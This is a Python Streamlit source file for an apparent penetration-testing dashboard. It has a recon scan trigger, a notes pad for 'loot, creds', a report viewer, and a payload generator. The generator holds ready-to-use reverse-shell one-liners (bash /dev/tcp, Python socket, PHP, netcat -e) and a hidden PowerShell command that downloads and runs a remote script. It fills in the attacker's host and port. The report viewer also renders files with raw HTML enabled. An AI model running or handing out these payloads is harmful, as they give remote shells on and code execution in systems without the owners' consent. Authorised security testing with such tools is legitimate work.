import streamlit as st
import requests
import os
from urllib.parse import quote

# --- PAGE CONFIG ---
st.set_page_config(page_title="Project Watchdog", page_icon="🎯", layout="wide")

# --- CSS: AESTHETICS ---
st.markdown("""
    <style>
    .stApp { background-color: #0f1117; color: #e0e0e0; }
    ::-webkit-scrollbar { width: 6px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
    ::-webkit-scrollbar-thumb:hover { background: #00ff41; }
    code { color: #ff4b4b !important; background-color: #1a1c23 !important; border-radius: 4px; }
    pre { background-color: #1a1c23 !important; border-left: 3px solid #00ff41; }
    .stTextArea textarea {
        background-color: #161b22 !important;
        color: #00ff41 !important;
        font-family: 'Courier New', monospace !important;
    }
    </style>
    """, unsafe_allow_html=True)

# --- PAYLOAD DATA ---
PAYLOADS = {
    "--- Select Payload ---": "",
    "Bash Rev Shell": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
    "Python3 Rev Shell": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
    "PHP Reverse Shell": "php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "Netcat Traditional": "nc -e /bin/sh LHOST LPORT",
    "PowerShell IWR": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')\"",
    "Stable TTY Upgrade": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Then: Ctrl+Z -> stty raw -echo; fg"
}

# --- LAYOUT SETUP ---
col_ctrl, col_reports = st.columns([1, 2], gap="large")

with col_ctrl:
    with st.container(height=900, border=False):
        st.title("Target Control")
        target_input = st.text_input("RECON TARGET", placeholder="e.g. nmap.scanme.org")
        
        if st.button("INITIALIZE SCAN", use_container_width=True):
            if target_input:
                try:
                    safe_target = quote(target_input)
                    webhook_url = f"http://<urip>:5678/webhook/scan?target={safe_target}"
                    response = requests.get(webhook_url) 
                    st.toast("Pipeline Active" if response.status_code == 200 else "Uplink Failed")
                except:
                    st.error("Connection Error")

        st.markdown("---")
        
        # --- QUICK NOTES SECTION ---
        st.subheader("📝 Quick Notes")
        notes_file = "/data/notes.txt"
        if not os.path.exists("/data"): os.makedirs("/data", exist_ok=True)
        
        # 1. Load initial data into state
        if "scratchpad_content" not in st.session_state:
            st.session_state.scratchpad_content = open(notes_file, "r").read() if os.path.exists(notes_file) else ""

        # 2. Text Area Widget
        st.text_area(
            "SCRATCHPAD", 
            key="scratchpad_content", 
            height=300, 
            label_visibility="collapsed",
            placeholder="Drop loot, creds, or raw output here..."
        )

        c_save, c_clear = st.columns(2)
        with c_save:
            if st.button("SAVE", use_container_width=True):
                with open(notes_file, "w") as f: f.write(st.session_state.scratchpad_content)
                st.toast("Saved to /data/notes.txt")

        with c_clear:
            with st.popover("CLEAR", use_container_width=True):
                # FIXED: Logic to clear without crashing Streamlit
                if st.button("CONFIRM WIPE", type="primary", use_container_width=True):
                    with open(notes_file, "w") as f: f.write("")
                    # Delete the key so it re-initializes on the next run
                    del st.session_state["scratchpad_content"]
                    st.rerun()

        st.markdown("---")
        
        # --- PAYLOAD GENERATOR SECTION ---
        st.subheader("💀 Payload Gen")
        selected_payload_name = st.selectbox("SELECT PAYLOAD", list(PAYLOADS.keys()))
        
        if PAYLOADS[selected_payload_name]:
            cp1, cp2 = st.columns(2)
            with cp1:
                lhost = st.text_input("LHOST", value="192.168.1.15")
            with cp2:
                lport = st.text_input("LPORT", value="4444")
                
            final_payload = PAYLOADS[selected_payload_name].replace("LHOST", lhost).replace("LPORT", lport)
            st.code(final_payload, language="bash")

with col_reports:
    with st.container(height=900, border=False):
        st.title("Intelligence Reports")
        report_dir = "/reports" 
        
        if os.path.exists(report_dir):
            files = [f for f in os.listdir(report_dir) if f.endswith('.md')]
            files.sort(key=lambda x: os.path.getmtime(os.path.join(report_dir, x)), reverse=True)
            
            if files:
                selected_file = st.selectbox("SELECT LOG", files)
                if selected_file:
                    st.markdown("---")
                    with open(os.path.join(report_dir, selected_file), 'r') as f:
                        st.markdown(f.read(), unsafe_allow_html=True)
            else:
                st.info("NO REPORTS FOUND.")
        else:
            st.error("PATH ERROR")
